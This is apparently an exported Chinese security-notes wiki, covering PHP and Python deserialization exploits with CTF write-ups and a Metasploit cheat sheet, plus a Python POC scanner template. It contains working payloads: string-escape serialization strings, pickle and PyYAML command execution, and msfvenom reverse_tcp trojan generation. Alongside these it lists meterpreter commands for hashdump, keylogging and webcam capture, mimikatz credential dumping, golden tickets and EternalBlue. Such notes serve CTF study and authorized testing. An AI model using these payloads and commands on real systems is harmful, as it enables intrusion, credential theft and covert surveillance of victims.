当存在以下流程：序列化→过滤→反序列化 过滤：在对可控变量进行过滤了之后，就会使得其序列化的长度与字符串长度不匹配，然后反序列化的时候就会报错，无法执行反序列化，就不会执行攻击者构造的攻击代码。但是利用前面提到的第一和第二个特性，攻击者可以分析过滤前后字符串长度的变化，构造字符串(字符串形式为被过滤字符+目标子串)来覆盖其他变量。 目标字串： \";+序列化后的变量+} 例如我想要逃逸$name='khaz'，那么目标字串为\";s:4:\"name\";s:4:\"khaz\";} 分类和思路 过滤后字符变多 思路：让过滤后的字符串填充完长度，从而让后面的变量解放出来 需要计算目标字串的长度l1和过滤后增加的长度l2 payload:被过滤字符*(l1/l2)+目标子串 假设对变量$a进行过滤 过滤规则：a→bb $a中的每个a在过滤后都会使字符串长度加1 假设目标子串为：\";s:8:\"password\";s:6:\"123456\";} 一共31个字符 就需要重复a31次，构造$a='aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\";s:8:\"password\";s:6:\"123456\";}' 这样序列化后有： s:62:\"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\";s:8:\"password\";s:6:\"123456\";}\" 此时长度对应字符：62:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\";s:8:\"password\";s:6:\"123456\";} 过滤后： s:62:\"bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\";s:8:\"password\";s:6:\"123456\";} 长度对应字符： 62:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb 从而使s:8:\"password\";s:6:\"123456\";解放出来 [0CTF 2016]piapiapia www.zip得到源码，审计得到如下关键点 flag在config.php 过滤函数 #用_代替\\和\\\\ $escape = array('\\'', '\\\\\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); #用hacker代替array('select', 'insert', 'update', 'delete', 'where') $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; return preg_replace($safe, 'hacker', $string); 字符串逃逸：字符串变多 where：5 → hacker：6 反序列化点 $profile = unserialize($profile); $phone = $profile['phone']; $email = $profile['email']; $nickname = $profile['nickname']; $photo = base64_encode(file_get_contents($profile['photo'])); 字符串逃逸覆盖$photo为config.php 序列化点 $profile['phone'] = $_POST['phone']; $profile['email'] = $_POST['email']; $profile['nickname'] = $_POST['nickname']; $profile['photo'] = 'upload/' . md5($file['name']); $user->update_profile($username, serialize($profile)); 正则 #11位数字 if(!preg_match('/^\\d{11}$/', $_POST['phone'])) die('Invalid phone'); #xxx@xxx.xxx xxx限制[_a-zA-Z0-9] if(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email'])) die('Invalid email'); #长度 10) die('Invalid nickname'); 需要绕过nickname的正则，用数组绕过即可。 需要逃逸的变量为$photo='config.php'，目标子串为\";s:5:\"photo\";s:10:\"config.php\";}，共33个字符，一个where在替换后长度加1，所以需要33个where。 payload string(320) \"a:4:{s:5:\"phone\";s:11:\"12345678901\";s:5:\"email\";s:16:\"734541725@qq.com\";s:8:\"nickname\";s:198:\"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";s:5:\"photo\";s:10:\"config.php\";}\";s:5:\"photo\";s:6:\"sadasd\";}\" 过滤后:a:4:{s:5:\"phone\";s:11:\"12345678901\";s:5:\"email\";s:16:\"734541725@qq.com\";s:8:\"nickname\";s:198:\"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker\";s:5:\"photo\";s:10:\"config.php\";}\";s:5:\"photo\";s:6:\"sadasd\";} 反序列化后：E:\\浏览器下载\\chrome\\新建文件夹\\2.php:21: array(4) { 'phone' => string(11) \"12345678901\" 'email' => string(16) \"734541725@qq.com\" 'nickname' => string(198) \"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker\" 'photo' => string(10) \"config.php\" } 这里还要注意的点就是因为要绕过正则，所以nickname→nickname[]，数组序列化后就需要闭合{，所以 nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";} 34个where，并且需要手动添加一个}来闭合多出的{ > string(24) \"a:1:{i:0;a:1:{i:0;i:1;}}\" 过滤后字符变少 思路：过滤后字符减少，会吃掉后面的字符，所以需要计算过滤处到目标子串的长度 见下面例子，因为这种情况需要观察序列化字符串才能得到过滤处到目标子串的长度，而不是像过滤后字符变多那样可以直接构造。 [安洵杯 2019]easy_serialize_php 过滤函数 function filter($img){ $filter_arr = array('php','flag','php5','php4','fl1g'); $filter = '/'.implode('|',$filter_arr).'/i'; return preg_replace($filter,'',$img); } 可控变量 $_SESSION[\"user\"] = 'guest'; $_SESSION['function'] = $function; 还有一个$_SESSION['img']是需要我们覆盖的变量 extract($_POST); 序列化→过滤→反序列化 $serialize_info = filter(serialize($_SESSION)); $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo['img'])); 目标子串 base64_encode(d0g3_f1ag.php)='ZDBnM19mMWFnLnBocA==' \";s:20:\"ZDBnM19mMWFnLnBocA==\";} 观察序列化字符串 >> 过滤前: a:3:{s:4:\"user\";s:4:\"flag\";s:8:\"function\"; s:41:\"\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\"; s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";} 过滤后: a:3:{s:4:\"user\";s:4:\"\";s:8:\"function\";s:41:\"\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";}\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";} 需要计算过滤处到目标子串的长度：\";s:8:\"function\";s:41:\" 长度为23，不为3或4的倍数，最接近的是24，所以在 目标子串头添加任意一个字符变成a\";s:20:\"ZDBnM19mMWFnLnBocA==\";} 所以过滤后会吃掉24个字符，所以可以选择4*6或者3*8 payload: >> 过滤前: a:3:{s:4:\"user\";s:24:\"flagflagflagflagflagflag\";s:8:\"function\";s:64:\"a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:4:\"khaz\";s:4:\"haha\";}\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";} 过滤后: a:3:{s:4:\"user\";s:24:\"\";s:8:\"function\";s:64:\"a\";s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\";s:4:\"khaz\";s:4:\"haha\";}\";s:3:\"img\";s:20:\"Z3Vlc3RfaW1nLnBuZw==\";} E:\\xampp2\\php\\www\\2.php:19: array(3) { 'user' => string(24) \"\";s:8:\"function\";s:64:\"a\" 'img' => string(20) \"ZDBnM19mMWFnLnBocA==\" 'khaz' => string(4) \"haha\" s:4:\"khaz\";s:4:\"haha\";添加了这个是因为$_SESSION有三个值(a:3),数量要对的上才能反序列化 s:4:\"user\";s:24:\"\";s:8:\"function\";s:64:\"a\"; s:3:\"img\";s:20:\"ZDBnM19mMWFnLnBocA==\"; s:4:\"khaz\";s:4:\"haha\"; 原生类利用 常见场景 echo new $this->key($this->value); 获取指定方法的原生类 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类 比如说题目给的代码有MD5，eval等，这些函数的参数都是字符串类型，所以可以触发__tostring魔术方法 Error/Exception 类 用于自定义错误类型的 类 适用版本 属性（一样的） Error php7 message：异常消息内容 file：抛出异常的文件名 Exception php5/php7 line：抛出异常在该文件中的行号 code：异常代码 >> Error: payload in D:\\phpstudy_pro\\phpstudy_pro\\WWW\\test\\1.php:2 Stack trace: #0 {main} Error: payload in D:\\phpstudy_pro\\phpstudy_pro\\WWW\\test\\1.php:3 Stack trace: #0 {main} 仔细观察会发现只有异常代码code没有被输出，并且只有行号line不同 利用 可用来绕过类属性的哈希比较 \"; echo $b; echo \"\"; echo 'md5($a)='.md5($a); echo \"\"; echo 'md5($b)='.md5($b); echo \"\"; echo 'sha1($a)='.sha1($a); echo \"\"; echo 'sha1($b)='.sha1($b); echo \"\"; if($a===$b) echo '相同'; else echo '不相同'; ?> 值不相同（对象，异常代码不同）,md5和sha1的值相同（输出的是一样的） [极客大挑战 2020]Greatphp if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ) eval($this->syc); 多了一个eval 只需要将payload构造为?>的形式即可,前面的?>把文件原来的闭合了。 ) ?> SoapClient类 内置call方法，当call方法被调用时，就会发起http请求，可以伪造ssrf请求 并因为可以自定义user_agent请求头从而造成crlf漏洞。 可能会出现的问题Fatal error: Uncaught Error: Class 'SoapClient' not found in CRLF注入是一类注入漏洞。是“回车+换行”的简称，又叫做回车换行符。 表示为\\r\\n，编码之后是%0d%0a。这个在HTTP协议中表示消息头与消息体之间的分隔。 浏览器就是根据这两个CRLF来分离HTTPHeader与HTTPBody的。从而把HTTP内容显示出来。所以，如果我们能够控制HTTP消息头的字符，那么我们就能够注入一些恶意的换行。 例子SoapClient::call方法发送soap请求,伪造post数据 在linux下执行 $target, 'user_agent'=>'khaz^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_string).'^^^^'.$post_string, 'uri'=>'hello')); $aaa = serialize($b); $aaa = str_replace('^^',\"\\r\\n\",$aaa); echo urlencode($aaa); //Test $c = unserialize($aaa); $c->notexists(); ?> 因为我们设置了Content-length，那么读取了data=abc后就会舍弃掉后面的数据 文件操作类 注：FilesystemIterator 是DirectoryIterator的子类，所以可以将DirectoryIterator换为FilesystemIterator。 遍历目录 查找文件 查找根目录的flag文件名 ​ GlobIterator 类支持直接通过模式匹配来寻找文件路径 确认文件路径 假设现在知道flag的文件名为flag，但不知道具体路径 当输出flag时，说明路径是正确的。 读取文件 一些trick php(phar)反序列化漏洞及各种绕过姿势反序列化漏洞及各种绕过姿势/#16进制绕过字符的过滤) GC机制绕过抛出异常 正常情况下抛出异常并且没有捕捉的话php是不会执行析构函数的 但在laravel这种框架里通常都有全局的错误处理与异常捕捉，显示通用的500或者错误页面。 只要异常被捕捉，后面的析构就会执行了。 $a = serialize(array(new test, null)); $a = str_replace('i:1;N', 'i:0;N', $a); 因为反序列化的过程是顺序执行的，所以到第一个属性时，会将Array[0]设置为对象，同时我们又将Array[0]设置为null，这样前面的test对象便丢失了引用，就会被GC所捕获，就可以执行__destruct了 绕过正则 if (preg_match('/^O:\\d+/',$data)){ die('nonono!'); }else{ return $data; } 用+O代替O 用数组绕过 serialize(array($a)); 绕过字符过滤 if(preg_match('/username/', $data)){ echo(\"nonono!!!\"); } else{ return $data; } $a = 'O:4:\"test\":1:{s:8:\"username\";s:5:\"admin\";}'; $a = 'O:4:\"test\":1:{S:8:\"\\\\75sername\";s:5:\"admin\";}'; 序列字符串中表示字符类型的s大写时，会被当成16进制解析。 绕过wake_up php版本 PHP5 反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过__wakeup( )的执行。 file = $file; } function __destruct() { echo @highlight_file($this->file, true); } function __wakeup() { if ($this->file != 'index.php') { //the secret is in the fl4g.php $this->file = 'index.php'; } } } if (isset($_GET['var'])) { $var = base64_decode($_GET['var']); if (preg_match('/[oc]:\\d+:/i', $var)) { die('stop hacking!'); } else { @unserialize($var); } } else { highlight_file(\"index.php\"); } ?> 绕过特定变量赋值 引用变量 在php里&相当于两个变量都指向同一个地址，修改一个会影响到另一个。 通过可变函数调用类方法 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-10-21 19:55:18 "},"03.代码审计/python反序列化.html":{"url":"03.代码审计/python反序列化.html","title":"Python反序列化","keywords":"","body":"pickle反序列化初探 题目 https://blog.csdn.net/satasun/article/details/109708593 python魔术方法指南 https://blog.csdn.net/bluehawksky/article/details/79027055 https://ca01h.top/Python/pysec/3.Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ pickle 序列化 pickle.dump(文件) pickle.dumps(字符串) 反序列化 pickle.load(文件) pickle.loads(字符串) 检测 全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。 payload #py2 import pickle import urllib class payload(object): def __reduce__(self): #第一个参数返回函数名，第二个参数返回函数所需参数 return (eval, (\"open('/flag.txt','r').read()\",)) a = pickle.dumps(payload()) a = urllib.quote(a) print a yaml 序列化 yaml.dump() 反序列化 yaml.load() 漏洞成因 由于 YAML 仅仅是一种格式规范，所以理论上一个支持 YAML 的解析器可以选择性支持 YAML 的某些语法，也可以在 YAML 的基础上利用 !! 来扩展额外的解析能力。 在python的 PyYAML中 yaml import yaml yaml.load('exp: !!python/object/apply:os.system [\"whoami\"]') 进入construct_python_object_apply函数 进入make_python_instance函数 进入find_python_name函数 然后return getattr('os','system') 返回给cls 然后return cls(*args, **kwds) --> os.system(whoami) 就执行了我们构造的命令。 最后返回给instance 如何构造payload Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2023-11-11 16:29:45 "},"04.工具使用/00.注意.html":{"url":"04.工具使用/00.注意.html","title":"00.注意","keywords":"","body":"使用工具时注意/和\\，一律用/，这样win和linux都能用 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-10 16:18:47 "},"04.工具使用/02.MSF.html":{"url":"04.工具使用/02.MSF.html","title":"02.MSF","keywords":"","body":"基本步骤 search xxx # 搜索某个模块 use xxx # 使用某个模块 show options # 查看配置选项 set payload # 配置攻击载荷 run/exploit # 执行渗透攻击 木马生成 Winodws msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=Kali监听端口 -f exe > msf.exe 参数选项： -p 指定的payload -e 编码器，x86/shikata_ga_nai -i 迭代器，对有效载荷的编码次数 -f 输出文件的格式,exe、dll、raw Linux msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=Kali监听端口 -f elf > msf.elf chmod +x ./msf.elf # 为木马添加执行权限 MSF监听 use exploit/multi/handler set payload windows/meterpreter/reverse_tcp # 设置的payload要一致，不然连不上 set LHOST Kali的IP set LPORT Kali监听端口 run Meterpreter 常用命令 pwd、ls、cd getuid # 查看当前权限 getsystem # 获得系统管理员权限（要本地管理员权限运行） hashdump # 抓哈希密码 sysinfo # 查看系统信息 idletim # 查看目标系统已运行时间 route # 查看目标机完整网络设置 shell # 进入目标机shell，exit退出she background # 将meterpreter隐藏在后台 upload ./1.txt c:\\\\1.txt # 上传文件 download c:\\1.txt ./ # 下载文件 search -f *.txt -d c:// # 搜索文件 keyscan_start # 启动键盘记录 keyscan_stop # 停止键盘记录 keyscan_dump # 转储键盘记录的内容 screenshot # 抓取截屏 webcam_list # 摄像头列表 webcam_snap # 摄像头拍照 webcam_stream # 抓取视频 进程迁移 ps | grep \"explore\" migrate pid # 将shell迁移到explorer.exe进程中 会话管理 background # 将当前会话放置后台 sessions # 会话管理 sessions -l # 列出所有会话 sessions -K # 终止所有会话 sessions -i id # 进入某个会话 会话派生到CS CS创建监听器 MSF background use exploit/windows/local/payload_inject set lhost 192.168.32.102 set lport 9999 set DisablePayloadHandler True set PrependMigrate True sessions -l set session 1 run 没成功，弹了个记事本？？？？ mimikatz load kiwi creds_all：列举所有凭据 creds_kerberos：列举所有kerberos凭据 creds_msv：列举所有msv凭据 creds_ssp：列举所有ssp凭据 creds_tspkg：列举所有tspkg凭据 creds_wdigest：列举所有wdigest凭据 dcsync：通过DCSync检索用户帐户信息 dcsync_ntlm：通过DCSync检索用户帐户NTLM散列、SID和RID golden_ticket_create：创建黄金票据 kerberos_ticket_list：列举kerberos票据 kerberos_ticket_purge：清除kerberos票据 kerberos_ticket_use：使用kerberos票据 lsa_dump_sam：dump出lsa的SAM lsa_dump_secrets：dump出lsa的密文 password_change：修改密码 wifi_list：列出当前用户的wifi配置文件 wifi_list_shared：列出共享wifi配置文件/编码 调用mimikatz 在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。 mimikatz命令 kiwi_cmd module::xxx kiwi_cmd sekurlsa::wdigest kiwi_cmd sekurlsa::logonpasswod 端口转发 portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口 隧道代理 run autoroute -s 192.168.52.0/24 # 为当前sesison添加路由 background use auxiliary/server/socks_proxy # socks5代理 set SRVHOST 127.0.0.1 run 配置proxychains使用该socks5代理 永恒之蓝 auxiliary/scanner/smb/smb_ms17_010 # 扫描模块 search exploit ms17_010 # 查找exp 更多 MSF渗透常用操作指南 - 跳跳糖 (tttang.com) Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-29 20:09:48 "},"04.工具使用/03.抓包工具.html":{"url":"04.工具使用/03.抓包工具.html","title":"03.抓包工具","keywords":"","body":"YAKIT MITM流程 https://mp.weixin.qq.com/s?__biz=Mzk0MTM4NzIxMQ==&mid=2247525424&idx=1&sn=8b545e6944b395e31bed96ee13d491e0&chksm=c39c24c90b2cfd9679b955a37131f78ffbfff315a1c4ede23564577047970a4c452ad4fd936a&scene=126&sessionid=1733387743#rd 浏览器请求 → 过滤器 → 请求内容规则处理 → 热加载hijackRequest方法 → Yakit请求劫持 → 热加载beforeRequest方法 → 服务器接收请求 → 过滤器 → 热加载hijackResponse方法→ 处理响应规则处理→ Yakit响应劫持→ 热加载afterRequest方法→ 响应内容规则处理 → 热加载hijackSaveHTTPFlow方法 → 流量进入数据库（History） 规则处理：HAE + Match And Replace beforeRequest 编写请求加密 afterRequest 在Web Fuzzer的热加载中编写响应解密，在MITM中的话会导致浏览器收到的是明文不能正常解密密文从而不显示数据 hijackSaveHTTPFlow 响应是加密的，如果想在yakit的响应包面板看到解密明文，而浏览器能够正常显示数据（接收密文解密），就需要在hijackSaveHTTPFlow中进行编写处理，这里处理的是镜像流量用于存储到数据库中 HAE规则转换 https://github.com/youmulijiang/HaeToYakit ​ 热加载代码 热加载代码示例 POST请求转文件上传格式 // 添加请求头 req = poc.AppendHTTPPacketHeader(req, \"AAA\", \"BBB\") // 修改请求头 req = poc.ReplaceHTTPPacketHeader(req, \"User-Agent\", \"123\") if str.Contains(string(req), \"Chromium\") { modified = str.ReplaceAll(string(req), \"Chromium\", \"aaaa\") forward(poc.FixHTTPRequest(modified)) } aes_cbc = func(password){ key = \"1234567890123456\" iv = \"1234567890123456\" //转化为json字符串 tmp = {\"username\":\"admin\",\"password\":password} data = json.dumps(tmp) // aes加密 enc_data = codec.EncodeBase64(codec.AESCBCEncryptWithPKCS7Padding(key, data, iv)~) // // 转换成请求包中的格式 // enc_data = codec.EncodeUrl(enc_data) // key = codec.DecodeBase64(\"+a0DokJ61de8c+F234PuCw==\")~ // // 传输的iv\"aes_iv\":\"8uPC+AA23lY\\/1LNCuXBERg==\"，这里传的/\\就是转义字符+\\ // iv = codec.DecodeBase64(`8uPC+AA23lY/1LNCuXBERg==`)~ // //转化为json字符串 // tmp = {\"username\":\"admin\",\"password\":password} // data = json.dumps(tmp) // // aes加密 // enc_data = codec.EncodeBase64(codec.AESCBCEncryptWithPKCS7Padding(key, data, iv)~) return enc_data } rsa = func(password){ pub_key=`-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb ocDbsNeCwNpRxwjIdQIDAQAB -----END PUBLIC KEY-----` //转化为json字符串 tmp = {\"username\":\"admin\",\"password\":password} data = json.dumps(tmp) //rsa加密 enc_data = codec.EncodeBase64(codec.RSAEncryptWithPKCS1v15(pub_key, data)~) return enc_data } aes_rsa_enc_key = func(param){ pub_key = `-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb ocDbsNeCwNpRxwjIdQIDAQAB -----END PUBLIC KEY-----` key = \"1234567890123456\" enc_key= codec.EncodeBase64(codec.RSAEncryptWithPKCS1v15(pub_key, codec.EncodeBase64(key))~) return enc_key } aes_rsa_enc_iv = func(param){ pub_key = `-----BEGIN PUBLIC KEY----- MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDRvA7giwinEkaTYllDYCkzujvi NH+up0XAKXQot8RixKGpB7nr8AdidEvuo+wVCxZwDK3hlcRGrrqt0Gxqwc11btlM DSj92Mr3xSaJcshZU8kfj325L8DRh9jpruphHBfh955ihvbednGAvOHOrz3Qy3Cb ocDbsNeCwNpRxwjIdQIDAQAB -----END PUBLIC KEY-----` iv = \"1234567890123456\" enc_iv= codec.EncodeBase64(codec.RSAEncryptWithPKCS1v15(pub_key, codec.EncodeBase64(iv))~) return enc_iv } Burp BurpBounty--自定义Payload测试 https://burpbounty.net/documentation-extension/#elementor-toc__heading-anchor-10 Param url：GET请求参数值 Param name url：GET请求参数 Entire body：POST请求体 Param json：json键值 中文乱码 User options –Display – HTTP Message Display – Change font ，中文字体+UTF-8编码 Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-24 20:55:43 "},"04.工具使用/04.gogo.html":{"url":"04.工具使用/04.gogo.html","title":"04.gogo","keywords":"","body":"单一ip端口扫描 gogo -i ip -p info -t 100 -ev gogo -i ip -p - -t 100 -ev// 全端口 gogo -i ip -p top2,top3 -t 100 -ev // 外网常见端口 指纹识别 -v 漏洞探测 -e 输出文件 --af // 保存结果 --hf // 文件名混淆 默认输出文件是通过deflate流式压缩，需要使用-F参数进行格式化 ./gogo -F /home/ubuntu/tools/.10.10.11.35_-_default_jl.dat Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-24 20:56:04 "},"04.工具使用/05.辅助工具.html":{"url":"04.工具使用/05.辅助工具.html","title":"05.辅助工具","keywords":"","body":"selistener 监听端口范围8000-8888 selistener -ps 8000 -pe 8888 -t token 监听端口列表 selistener -pn 8888,8080 -t token web页面（默认65535端口）进行查询 words参数，根据内容查询请求，exp: words=/index ip参数，根据ip查询请求，exp: ip=127.0.0.1 port参数，根据端口查询请求，exp: port=8081 protocol参数，根据协议查询请求，exp: protocol=http gohttpserver gohttpserver -r ./ --addr 0.0.0.0:8000 --upload --auth-type http --auth-http bdiasudiaubd:&*%^FTF%%^ Copyright © Khaz 2024 all right reserved，powered by Gitbook该文章修订时间： 2024-12-24 21:07:21 "},"05.编程开发/Python/POC模板.html":{"url":"05.编程开发/Python/POC模板.html","title":"POC编写","keywords":"","body":"单个POC模板 import os import time from urllib import response from urllib.parse import urljoin from weakref import proxy import requests from threading import Lock from concurrent.futures import ThreadPoolExecutor from argparse import ArgumentParser from colorama import init from colorama import Fore init(autoreset=True) requests.packages.urllib3.disable_warnings() class POC: def __init__(self): self.banner() self.args = self.parseArgs() if self.args.file: self.init() self.urlList = self.loadURL() self.multiRun() self.start = time.time() else: self.verfyurl() def banner(self): logo = r\"\"\" .__ ____ ___ ________ _____ ______ | | ____ _/ __ \\\\ \\/ /\\__ \\ / \\\\____ \\| | _/ __ \\ \\ ___/ > > |_\\ ___/ \\___ >__/\\_ \\(____ /__|_| / __/|____/\\___ > \\/ \\/ \\/ \\/|__| \\/ author： Khaz GitHub： https://github.com/Khaz \"\"\" print(\"\\033[91m\" + logo + \"\\033[0m\") def parseArgs(self): date = time.strftime(\"%Y-%m-%d_%H-%M-%S\", time.localtime()) parser = ArgumentParser() parser.add_argument(\"-u\", \"--url\", required=False, type=str, help=\"Target url(e.g. http://127.0.0.1)\") parser.add_argument(\"-f\", \"--file\", required=False, type=str, help=f\"Target file(e.g. url.txt)\") parser.add_argument(\"-t\", \"--thread\", required=False, type=int, default=5, help=f\"Number of thread (default 5)\") parser.add_argument(\"-T\", \"--timeout\", required=False, type=int, default=3, help=\"Request timeout (default 3)\") parser.add_argument(\"-o\", \"--output\", required=False, type=str, default=date, help=f\"Vuln url output file (e.g. result.txt)\") parser.add_argument(\"-p\", \"--proxy\", default=None, help=\"Request Proxy (e.g http://127.0.0.1:8080)\") return parser.parse_args() def proxy_server(self): proxy = self.args.proxy return proxy # 初始化脚本配置 def init(self): print(\"\\nthread:\", self.args.thread) print(\"timeout:\", self.args.timeout) msg = \"\" if os.path.isfile(self.args.file): msg += \"Load url file successfully\\n\" else: msg += f\"\\033[31mLoad url file {self.args.file} failed\\033[0m\\n\" print(msg) if \"failed\" in msg: print(\"Init failed, Please check the environment.\") os._exit(0) print(\"Init successfully\") # 返回poc的返回包 def respose(self, url): proxy = self.args.proxy proxies = None if proxy: proxies = {\"http\": proxy, \"https\": proxy} path = \"/jeecg-boot/sys/user/querySysUser?username=admin\" url = urljoin(url, path) headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\", } try: response = requests.post(url, headers=headers, proxies=proxies, timeout=self.args.timeout, verify=False, allow_redirects=False) resp = response.text return resp except: return \"conn\" # 单条url检测 def verfyurl(self): url = self.args.url repData = self.respose(url) if \"\\\"username\\\":\\\"admin\\\"\" in repData: print(Fore.GREEN +\"[+] 漏洞存在！！！[+] url: {}\".format(url)) elif \"conn\" in repData: print(\"[-] URL连接失败！ [-] url: {}\".format(url)) else: print(\"[x] 未检测到漏洞！[x] url: {}\".format(url)) # 多条url检测 def verify(self, url): repData = self.respose(url) if \"\\\"username\\\":\\\"admin\\\"\" in repData: msg = Fore.GREEN +\"[+] 漏洞存在！！！[+] url: {}\".format(url) self.lock.acquire() try: self.findCount +=1 self.vulnRULList.append(url) finally: self.lock.release() elif \"conn\" in repData: msg = \"[-] URL连接失败！ [-] url: {}\".format(url) else: msg = \"[x] 未检测到漏洞！[x] url: {}\".format(url) self.lock.acquire() try: print(msg) finally: self.lock.release() # 导入文件中的url def loadURL(self): urlList = [] with open(self.args.file, encoding=\"utf8\") as f: for u in f.readlines(): u = u.strip() urlList.append(u) return urlList # 多线程 def multiRun(self): self.findCount = 0 self.vulnRULList = [] self.lock = Lock() executor = ThreadPoolExecutor(max_workers=self.args.thread) if self.args.url: executor.map(self.verify, self.url) else: executor.map(self.verify, self.urlList) # 保存结果 def output(self): if not os.path.isdir(r\"./output\"): os.mkdir(r\"./output\") self.outputFile = f\"./output/{self.args.output}.txt\" with open(self.outputFile, \"a\") as f: for url in self.vulnRULList: f.write(url + \"\\n\") # 结果统计输出 def __del__(self): try: print(\"\\nAlltCount：\\033[31m%d\\033[0m\\nVulnCount：\\033[32m%d\\033[0m\" % (len(self.urlList), self.findCount)) self.end = time.time() print(\"Time Spent: %.2f\" % (self.end - self.start)) self.output() print(\"-\" * 20, f\"\\nThe vulnURL has been saved in {self.outputFile}\\n\") except: pass if __name__ == \"__main__\": POC() 文件上传poc JSP 通过调用application.getRealPath(request.getServletPath())来获取当前请求的Servlet路径，并将其转换为真实的文件路径。然后，使用new File()来创建一个表示该文件的File对象，并调用.delete()方法来删除该文件。 PHP 命令执行POC echo $((8#77777)) # 有回显检测32767 curl dnslog # 能出网检测dnslog 文件上传 假设上传文件的表单如下 对应脚本 import requests url = 'http://e1c9d16a-1928-4d06-8480-e770e3b7a0a8.node4.buuoj.cn:81' # { name : (文件名,文件内容，文件MIME) } 将文件信息填入元组（）中，只有文件内容是必选的。 # 上传本地文件 files = {\"file\": (\"sess\", open('D:\\phpstudy_pro\\phpstudy_pro\\Extensions/tmp/tmp/sess_t6c3cbbvj9p0k6njfkso5kmddr', 'rb'))} # 直接上传文件内容字符串（注意要用二进制） # files = {\"file\": (\"sess\", b'\\x08usernames:5:\"admin\";')} data = { 'direction':'upload', 'attr':'' } res = requests.post(url, data=data ,files=files) 配合burp抓包 pro = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' } # verify=False不鉴别burp的ssl证书，否则无法代理https requests.get(url=url,proxies=pro, verify=False) 脚本参数 python xx.py aa sys.argv[0]→xx.py sys.argv[1]→aa import argparse parser = argparse.ArgumentParser() parser.add_argument(\"-u\",\"--url\", type=str, help=\"target url\") parser.add_argument(\"-t\", \"--threads\" , type=int, help=\"threads num\") args = parser.parse_args() >> python xx.py -u xx.com -t 20 args.url=xx.com args.threads=20 多线程 import requests from concurrent.futures import ThreadPoolExecutor, as_completed f= open('./host.txt','w') def get(url): res = requests.get(url=url) if res.status_code == 200: f.write(url+\"\\n\") if __name__ == '__main__': urls=[] for i in range(0,500): urls.append('http://192-168-1-{}.pvp2039.bugku.cn'.format(i)) with ThreadPoolExecutor(max_workers=50) as pool: # 提交任务 futures = [pool.submit(get,url) for url in urls] # 等待所有任务完成 for future in as_completed(futures): result = future.result() if result: print(result) import requests import threading # 设置最大并发数量为20 max_concurrent = threading.BoundedSemaphore(20) def 